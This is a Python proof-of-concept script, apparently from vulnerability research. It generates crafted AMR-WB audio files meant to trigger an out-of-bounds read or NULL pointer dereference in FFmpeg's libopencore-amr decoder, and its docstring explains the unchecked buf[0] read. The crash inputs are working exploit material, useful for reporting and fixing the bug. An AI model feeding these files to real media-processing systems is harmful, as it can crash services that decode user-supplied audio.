#!/usr/bin/env python3
"""
VULN 002: AMR-WB Decoder buf[0] OOB Read Before Size Check
CWE-125 / CWE-476

The bug is in amr_wb_decode_frame() at line 351 of libopencore-amr.c:
    mode = (buf[0] >> 3) & 0x000F;   // <-- reads buf[0] BEFORE checking buf_size

If avpkt->size==0 and avpkt->data==NULL, this is a NULL pointer dereference.

AMR-WB file format:
  Magic: b"#!AMR-WB\\n" (9 bytes)
  Frames: each frame = 1 header byte + payload
  Frame header: bits [6:3] = FT (Frame Type), determines payload length

amrwb_packed_size table (in parser):
  FT:  0   1   2   3   4   5   6   7   8   9  10  11  12  13  14  15
  sz: 18  24  33  37  41  47  51  59  61   6   1   1   1   1   1   1

block_size table (in decoder):
  FT:  0   1   2   3   4   5   6   7   8   9  10  11  12  13  14  15
  sz: 18  24  33  37  41  47  51  59  61   6   6   0   0   0   1   1

Strategy: generate multiple crafted AWB files to attempt to trigger the
decoder with avpkt->size==0 or small enough to expose the pre-check read.

Approaches:
  1. Magic only (no frame data) - causes EOF flush path
  2. Magic + single FT=15 frame byte (packed_size=1, block_size=1)
  3. Magic + FT=11 byte (packed_size=1, decoder block_size=0 -> "invalid" path)
  4. Magic + FT=0 header but truncated payload (parser waits, EOF flush)
  5. Completely empty file fed as raw amrwb
"""

import struct
import os

# AMR-WB magic header
AMRWB_MAGIC = b'#!AMR-WB\n'

out_dir = os.path.dirname(os.path.abspath(__file__))

def write_file(name, data):
    path = os.path.join(out_dir, name)
    with open(path, 'wb') as f:
        f.write(data)
    print(f"[+] Written {path} ({len(data)} bytes)")
    return path

# -------------------------------------------------------------------------
# Primary target: vuln_002_input.awb
# Approach: magic header only (9 bytes), no frame data.
# When ffmpeg reads this file, the demuxer finds the magic, then hits EOF
# immediately. The AMR parser may receive a flush call with buf_size=0,
# or the decoder may be flushed with avpkt->data=NULL, triggering the bug.
# -------------------------------------------------------------------------
write_file('vuln_002_input.awb', AMRWB_MAGIC)

# -------------------------------------------------------------------------
# Alternate 1: magic + FT=15 frame header (1 byte packet to decoder)
# FT=15: header byte = 0x7C  (binary: 0 1111 1 00)
#   bits[6:3] = 1111 = 0xF = 15
# Parser packed_size[15] = 1 → sends 1-byte packet
# Decoder block_size[15] = 1 → valid, but D_IF_decode gets 1-byte buf
# -------------------------------------------------------------------------
ft15_header = 0x7C  # (15 << 3) | 0x4 = 0x7C (Q-bit set)
write_file('vuln_002_ft15.awb', AMRWB_MAGIC + bytes([ft15_header]))

# -------------------------------------------------------------------------
# Alternate 2: magic + FT=11 frame header (decoder block_size[11]=0)
# FT=11: header byte = (11 << 3) | 0x4 = 0x5C
# Parser packed_size[11] = 1 → sends 1-byte packet
# Decoder: mode=11, block_size[11]=0, then check: 0 > 1 is false,
#   then !packet_size is true → "amr packet_size invalid"
# This tests the path AFTER the buf[0] read with a valid 1-byte buffer.
# -------------------------------------------------------------------------
ft11_header = (11 << 3) | 0x04  # = 0x5C
write_file('vuln_002_ft11.awb', AMRWB_MAGIC + bytes([ft11_header]))

# -------------------------------------------------------------------------
# Alternate 3: magic + FT=0 header but NO payload (truncated)
# FT=0: parser expects 18 bytes (header + 17 payload bytes)
# We give only the header byte → parser accumulates, hits EOF, flushes
# -------------------------------------------------------------------------
ft0_header = (0 << 3) | 0x04  # = 0x04
write_file('vuln_002_truncated.awb', AMRWB_MAGIC + bytes([ft0_header]))

# -------------------------------------------------------------------------
# Alternate 4: completely empty file (for use with -f amrwb raw demuxer)
# -------------------------------------------------------------------------
write_file('vuln_002_empty.raw', b'')

# -------------------------------------------------------------------------
# Alternate 5: single byte FT=11 (for -f amrwb raw demuxer, no magic)
# -------------------------------------------------------------------------
write_file('vuln_002_ft11.raw', bytes([ft11_header]))

# -------------------------------------------------------------------------
# Alternate 6: magic + zero-length frame section crafted to confuse parser
# Use FT=9 (SID, packed_size=6, block_size=6): give only 1 byte payload
# -------------------------------------------------------------------------
ft9_header = (9 << 3) | 0x04  # = 0x4C
write_file('vuln_002_ft9_partial.awb', AMRWB_MAGIC + bytes([ft9_header, 0x00]))

print("\n[+] All test files generated.")
print("[+] Primary target: vuln_002_input.awb")
